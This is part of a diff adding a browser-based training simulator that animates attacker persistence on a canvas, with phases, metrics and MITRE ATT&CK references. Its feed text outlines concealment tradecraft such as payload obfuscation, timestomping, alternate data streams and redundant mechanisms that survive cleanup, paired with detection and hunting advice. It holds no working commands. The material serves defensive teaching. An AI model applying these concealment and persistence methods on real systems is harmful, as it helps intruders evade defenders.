+      if(e.t >= 1) STATE.events.splice(i,1);
+    }
+  }
+  STATE.nodes.forEach(function(n){ if(n.glow > 0) n.glow -= 0.008 * (dt/16); if(n.glow < 0) n.glow = 0; });
+
+  if(STATE.running && STATE.tick % 60 === 0){
+    spawnPacket('persist','c2','#a855f7','BEACON',0.03);
+  }
+
+  render();
+  updateBadges();
+  requestAnimationFrame(loop);
+}
+
+function render(){
+  var W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
+  var bg = ctx.createRadialGradient(W*0.5,H*0.4,50,W*0.5,H*0.4,W*0.7);
+  bg.addColorStop(0,'#0a0e1a'); bg.addColorStop(1,'#05070d');
+  ctx.fillStyle = bg; ctx.fillRect(0,0,W,H);
+
+  ctx.strokeStyle = 'rgba(30,41,59,0.4)'; ctx.lineWidth = 0.5;
+  for(var x=0;x<W;x+=40){ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for(var y=0;y<H;y+=40){ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  drawZone(0.05*W, 0.08*H, 0.90*W, 0.75*H, 'PERSISTENCE · ' + STATE.plat.toUpperCase(), '#a855f7');
+
+  var links = [
+    ['attacker','target'], ['target','persist'], ['persist','c2'],
+    ['boot','persist'], ['persist','siem']
+  ];
+  links.forEach(function(pair){
+    var na = STATE.nodes.find(function(n){return n.id===pair[0];});
+    var nb = STATE.nodes.find(function(n){return n.id===pair[1];});
+    if(!na || !nb) return;
+    ctx.beginPath();
+    ctx.moveTo(na.x, na.y);
+    ctx.lineTo(nb.x, nb.y);
+    ctx.strokeStyle = 'rgba(168,85,247,0.3)';
+    ctx.lineWidth = 1.5;
+    ctx.stroke();
+  });
+
+  STATE.events.forEach(function(e){
+    if(e.type === 'packet'){
+      var px = e.from.x + (e.to.x - e.from.x) * e.t;
+      var py = e.from.y + (e.to.y - e.from.y) * e.t;
+      ctx.save();
+      ctx.shadowColor = e.color; ctx.shadowBlur = 10;
+      ctx.fillStyle = e.color;
+      ctx.beginPath(); ctx.arc(px, py, e.size, 0, Math.PI*2); ctx.fill();
+      if(e.label){
+        ctx.font = '8px "Courier New",monospace';
+        ctx.fillStyle = e.color; ctx.textAlign = 'center';
+        ctx.fillText(e.label, px, py - 10);
+      }
+      ctx.restore();
+    }
+  });
+
+  STATE.nodes.forEach(function(n){
+    drawIcon(n.icon, n.x, n.y, n.color, n.glow, n.blink, n.label, n.ip);
+    if(n.id === 'persist' && STATE.mechs > 0){
+      ctx.save();
+      ctx.font = 'bold 9px "Courier New",monospace';
+      ctx.fillStyle = '#d8b4fe';
+      ctx.textAlign = 'center';
+      ctx.fillText(STATE.mechs + ' MECHANISMS', n.x, n.y - 25);
+      ctx.restore();
+    }
+  });
+
+  // Info overlay
+  if(STATE.phaseIdx > 0){
+    var t = TECHNIQUES[STATE.tech];
+    ctx.save();
+    var ax = 0.05*W, ay = H - 150, aw = 0.55*W, ah = 120;
+    ctx.fillStyle = 'rgba(30,15,50,0.9)';
+    ctx.strokeStyle = '#a855f7';
+    ctx.lineWidth = 1.5;
+    ctx.fillRect(ax, ay, aw, ah);
+    ctx.strokeRect(ax, ay, aw, ah);
+    ctx.font = 'bold 10px "Courier New",monospace';
+    ctx.fillStyle = '#d8b4fe';
+    ctx.textAlign = 'left';
+    ctx.fillText('\u25B8 ' + t.title, ax + 8, ay + 16);
+    ctx.font = '9px "Courier New",monospace';
+    ctx.fillStyle = '#cbd5e1';
+    ctx.fillText('Platform: ' + t.platform.toUpperCase() + ' | Trigger: ' + STATE.trigger.toUpperCase(), ax + 8, ay + 36);
+    ctx.fillText('Mechanisms installed: ' + STATE.mechs + ' | Redundancy: ' + STATE.redundancy, ax + 8, ay + 52);
+    ctx.fillText('Stealth: ' + Math.round(STATE.stealth*100) + '% | IOCs generated: ' + STATE.iocs, ax + 8, ay + 68);
+    ctx.fillStyle = '#fcd34d';
+    ctx.fillText('Survival: ' + STATE.survival + '% | Dwell TTL: ' + STATE.ttl, ax + 8, ay + 84);
+    ctx.fillStyle = STATE.detected ? '#ef4444' : '#4ade80';
+    ctx.fillText('Detected: ' + (STATE.detected ? 'YES' : 'NO'), ax + 8, ay + 100);
+    ctx.restore();
+  }
+
+  ctx.save();
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = 'rgba(100,116,139,0.6)';
+  ctx.textAlign = 'left';
+  ctx.fillText('Multiple mechanisms = resilience — remove one, others survive', 12, H - 74);
+  ctx.fillText('Detection: FIM + auditd + Sysmon + K8s audit + CloudTrail', 12, H - 62);
+  ctx.fillText('Eradication: identify ALL mechanisms, document, then remove', 12, H - 50);
+  ctx.fillText('Prevention: least privilege + allowlist + immutable infra', 12, H - 38);
+  ctx.fillText('MITRE TA0003 (Persistence) \u00B7 T1547 \u00B7 T1053 \u00B7 T1543 \u00B7 T1136', 12, H - 26);
+  ctx.restore();
+}
+
+function drawZone(x, y, w, h, label, color){
+  ctx.save();
+  ctx.strokeStyle = color; ctx.globalAlpha = 0.25; ctx.lineWidth = 1;
+  ctx.setLineDash([6,4]); ctx.strokeRect(x, y, w, h);
+  ctx.globalAlpha = 0.6;
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.fillStyle = color; ctx.textAlign = 'left';
+  ctx.fillText(label, x + 6, y + 14);
+  ctx.restore();
+}
+
+function updateBadges(){
+  document.getElementById('badgePlat').textContent = STATE.plat.toUpperCase();
+  document.getElementById('badgeTech').textContent = STATE.tech.toUpperCase();
+  document.getElementById('badgeStatus').textContent = STATE.running ? 'INSTALLING' : (STATE.phaseIdx >= 6 ? 'PERSISTED' : 'IDLE');
+  document.getElementById('badgeDetected').textContent = STATE.detected ? 'YES' : 'NO';
+
+  document.getElementById('mMechsVal').textContent = STATE.mechs;
+  document.getElementById('mRedundancyVal').textContent = STATE.redundancy;
+  document.getElementById('mSurvivalVal').textContent = STATE.survival + '%';
+  document.getElementById('mStealthVal').textContent = Math.round(STATE.stealth*100) + '%';
+  document.getElementById('mDetectedVal').textContent = STATE.detected ? 'YES' : 'NO';
+  document.getElementById('mIOCsVal').textContent = STATE.iocs;
+  document.getElementById('mTTLVal').textContent = STATE.ttl;
+  document.getElementById('mDefenseVal').textContent = STATE.detected ? 'DETECTED' : 'BLIND';
+
+  document.getElementById('mDetected').className = 'metric' + (STATE.detected ? ' bad' : ' ok');
+  document.getElementById('mSurvival').className = 'metric' + (STATE.survival > 70 ? ' bad' : STATE.survival > 30 ? ' warn' : '');
+  document.getElementById('mMechs').className = 'metric purple';
+}
+
+function advancePhase(){
+  if(STATE.phaseIdx >= PHASES.length){
+    STATE.running = false;
+    return;
+  }
+  var phase = PHASES[STATE.phaseIdx];
+  PHASES.forEach(function(p,i){
+    var el = document.getElementById('pp-' + p);
+    if(!el) return;
+    el.className = 'per-phase';
+    if(i < STATE.phaseIdx) el.classList.add('done');
+    else if(i === STATE.phaseIdx && STATE.running) el.classList.add('active');
+  });
+
+  var t = TECHNIQUES[STATE.tech];
+
+  switch(phase){
+    case 'STAGE':
+      addFeed('STAGE', 'Staging persistence payload: ' + STATE.payload.substring(0, 60) + '. Written to /tmp (or C:\\Users\\Public on Windows). Stealth: ' + Math.round(STATE.stealth*100) + '%. ' + (STATE.stealth > 0.7 ? 'Payload obfuscated (base64, XOR), filename mimics legit binary.' : 'Plaintext payload — easily flagged.'), 'info');
+      STATE.iocs += 2;
+      break;
+
+    case 'INSTALL':
+      STATE.mechs++;
+      STATE.iocs += 3;
+      spawnPacket('attacker','persist','#a855f7','INSTALL',0.03);
+      addFeed('INSTALL', 'Installing persistence via ' + t.title + '. ' + t.detail, 'error');
+      addCommandFeed('install-persistence --technique ' + STATE.tech + ' --trigger ' + STATE.trigger,
+        '[+] Persistence installed\n' +
+        '[+] Mechanism: ' + t.title + '\n' +
+        '[+] Trigger: ' + STATE.trigger + '\n' +
+        '[+] IOC count: ' + STATE.iocs);
+      break;
+
+    case 'CONCEAL':
+      var concealSuccess = STATE.stealth > 0.5;
+      if(concealSuccess){
+        addFeed('CONCEAL', 'Concealment applied: timestomping (modify MAC times to match system files), hide from file listing (dot-prefix, alternate data streams), obfuscate command line. Stealth: ' + Math.round(STATE.stealth*100) + '%.', 'warn');
+      } else {
+        addFeed('CONCEAL', 'Concealment WEAK — payload visible to basic enumeration. Stealth: ' + Math.round(STATE.stealth*100) + '%. Recommend higher obfuscation.', 'warn');
+      }
+      break;
+
+    case 'TRIGGER':
+      addFeed('TRIGGER', 'Trigger set: ' + STATE.trigger.toUpperCase() + '. ' + (STATE.trigger === 'onboot' ? 'Runs on system boot — survives restart. Requires elevated privileges for /etc/.' : STATE.trigger === 'onlogin' ? 'Runs on user login — survives logoff/login cycles.' : STATE.trigger === 'minute' ? 'Runs every minute — high beacon frequency but also detectable traffic pattern.' : STATE.trigger === 'idle' ? 'Runs on user idle — quiet, low overhead.' : 'Scheduled trigger.'), 'info');
+      break;
+
+    case 'SURVIVE':
+      STATE.survival = Math.min(100, Math.round(STATE.redundancy * 15 + STATE.stealth * 40));
+      if(STATE.redundancy >= 3 && STATE.stealth > 0.7){
+        addFeed('SURVIVE', 'HIGH SURVIVAL: ' + STATE.mechs + ' redundant mechanisms. Removing one (e.g., cron entry) leaves ' + (STATE.mechs - 1) + ' others active. Reboot → all restart. Logout → all restart. Standard cleanup will miss at least one.', 'error');
+      } else if(STATE.redundancy >= 2){
+        addFeed('SURVIVE', 'MEDIUM SURVIVAL: ' + STATE.mechs + ' mechanisms. Cross-platform cleanup required.', 'warn');
+      } else {
+        addFeed('SURVIVE', 'LOW SURVIVAL: single mechanism. Once identified, easy to remove.', 'ok');
+      }
+      STATE.ttl = STATE.survival > 70 ? '>30 days' : STATE.survival > 30 ? '5-30 days' : '<5 days';
+      break;
+
+    case 'OPERATE':
+      spawnPacket('persist','c2','#a855f7','BEACON',0.03);
+      addFeed('OPERATE', 'Persistent access established. Attacker can reconnect via C2 after ANY reboot/logout. ' + t.detection + ' Cleanup requires: ' + t.cleanup + '. Always document BEFORE removing (chain of custody).', 'error');
+      addFeed('DEFENSE', 'Defense in depth against persistence: (1) FIM on critical paths (cron, systemd, Run keys, LaunchAgents, authorized_keys). (2) Auditd/Sysmon with rules for T1053/T1547 events. (3) EDR with behavioral detection (rare parent-child, encoded commands). (4) Application allowlisting (AppLocker, SELinux, AppArmor). (5) Least privilege — persistence requires elevated rights. (6) Immutable infrastructure (containers, IaC — no manual state). (7) Regular baseline diff — new files, new services, new tasks. (8) Threat hunting with ATT&CK coverage maps. (9) Cloud: monitor IAM changes + GuardDuty. (10) Tabletop exercises for post-persistence IR.', 'ok');
+      break;
+  }
+  STATE.phaseIdx++;
+}
+
+function resetAll(){
+  STATE.running = false;
+  STATE.phaseIdx = 0;
+  STATE.mechs = 0;
+  STATE.survival = 0;
+  STATE.detected = false;
+  STATE.iocs = 0;
+  STATE.ttl = '—';
+  STATE.events = [];
+  PHASES.forEach(function(p){ var el = document.getElementById('pp-' + p); if(el) el.className = 'per-phase'; });
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('RESET', 'Persistence state cleared.', 'info');
+  termWrite('reset --all\n[+] Persistence mechanisms removed\n[+] Baselines restored');
+}
+
+document.getElementById('platSelect').addEventListener('change', function(e){
+  STATE.plat = e.target.value;
+  addFeed('PLATFORM', 'Platform: ' + STATE.plat.toUpperCase() + '.', 'info');
+});
+document.getElementById('techSelect').addEventListener('change', function(e){
+  STATE.tech = e.target.value;
+  var t = TECHNIQUES[STATE.tech];
+  addFeed('TECH', t.title + '. ' + t.detail, 'warn');
+});
+document.getElementById('payloadInput').addEventListener('input', function(e){ STATE.payload = e.target.value; });
+document.getElementById('triggerSelect').addEventListener('change', function(e){ STATE.trigger = e.target.value; });
+
+document.getElementById('stealthSlider').addEventListener('input', function(e){
+  STATE.stealth = parseInt(e.target.value) / 100;
+  document.getElementById('stealthVal').textContent = e.target.value + '%';
+});
+document.getElementById('redunSlider').addEventListener('input', function(e){
+  STATE.redundancy = parseInt(e.target.value);
+  document.getElementById('redunVal').textContent = e.target.value;
+});
+
+document.getElementById('startBtn').addEventListener('click', function(){
+  if(STATE.running) return;
+  STATE.running = true;
+  STATE.phaseIdx = 0;
+  STATE.mechs = 0;
+  STATE.survival = 0;
+  STATE.detected = false;
+  STATE.iocs = 0;
+  STATE.ttl = '—';
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('INSTALL', 'Installing persistence: ' + TECHNIQUES[STATE.tech].title + ' on ' + STATE.plat.toUpperCase(), 'warn');
+  var interval = setInterval(function(){
+    if(!STATE.running){ clearInterval(interval); return; }
+    advancePhase();
+    if(STATE.phaseIdx >= 6){ clearInterval(interval); STATE.running = false; }
+  }, 1200);
+});
+
+document.getElementById('stepBtn').addEventListener('click', function(){
+  if(!STATE.running){ STATE.running = true; STATE.phaseIdx = 0; }
+  advancePhase();
+});
+
+document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+document.getElementById('detectBtn').addEventListener('click', function(){
+  var detectChance = 0.3 + (1 - STATE.stealth) * 0.5 + STATE.iocs * 0.05;
+  if(Math.random() < detectChance){
+    STATE.detected = true;
+    addFeed('DETECT', 'DETECTED by EDR/FIM! Alert fired: unauthorized persistence mechanism. ' + TECHNIQUES[STATE.tech].detection + ' IR team engaged — will hunt for other mechanisms before cleanup.', 'warn');
+    STATE.nodes.find(function(n){return n.id==='siem';}).glow = 1;
+  } else {
+    addFeed('DETECT', 'Not detected by current telemetry. Recommend: enable FIM on critical paths, auditd/Sysmon with T1053/T1547 rules, EDR with behavior detection. IOC count now ' + STATE.iocs + ' — each is a detection opportunity.', 'error');
+  }
+});
+
+document.getElementById('huntBtn').addEventListener('click', function(){
+  addFeed('HUNT', 'Proactive threat hunt for persistence: (1) Enumerate cron/systemd/LaunchAgents/Run keys/scheduled tasks. (2) Compare to baseline snapshots. (3) Check file hashes + signatures. (4) Review recent auth (new accounts, SSH keys). (5) Cloud: check IAM access keys + trust policies. Document EVERYTHING before removing.', 'info');
+  addCommandFeed('hunt-persistence --all-platforms --compare-baseline',
+    '[*] Linux: 3 cron entries, 1 systemd unit, 2 SSH keys (1 unknown)\n' +
+    '[*] Windows: 4 Run keys, 1 suspicious service, 0 WMI subscriptions\n' +
+    '[*] macOS: 2 LaunchAgents (1 unsigned plist)\n' +
+    '[*] Cloud: 1 unexpected IAM access key (created 3d ago)\n' +
+    '[!] 4 high-confidence persistence indicators found');
+});
+
+document.getElementById('teachingToggle').addEventListener('click', function(){
+  var on = this.classList.toggle('active');
+  this.textContent = on ? '\uD83D\uDCD6 TEACHING: ON' : '\uD83D\uDCD6 TEACHING: OFF';
+});
+document.getElementById('voiceToggle').addEventListener('click', function(){
+  VOICE.enabled = !VOICE.enabled;
+  this.classList.toggle('active', VOICE.enabled);
+  this.textContent = VOICE.enabled ? '\uD83D\uDD0A VOICE: ON' : 'VOICE: OFF';
+});
+
+window.addEventListener('load', boot);
+</script>
+</body>
+</html>
